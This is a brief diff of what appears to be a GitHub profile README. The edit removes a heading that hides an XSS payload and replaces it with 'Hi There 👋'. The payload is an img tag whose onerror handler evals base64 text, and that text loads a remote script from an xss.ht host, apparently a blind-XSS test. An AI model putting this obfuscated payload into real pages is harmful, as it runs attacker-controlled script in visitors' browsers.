@@ -1,4 +1,4 @@
-### "><img src=x abc id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))> 👋
+### Hi There 👋
 
 <!--
 **aydinnyunus/aydinnyunus** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
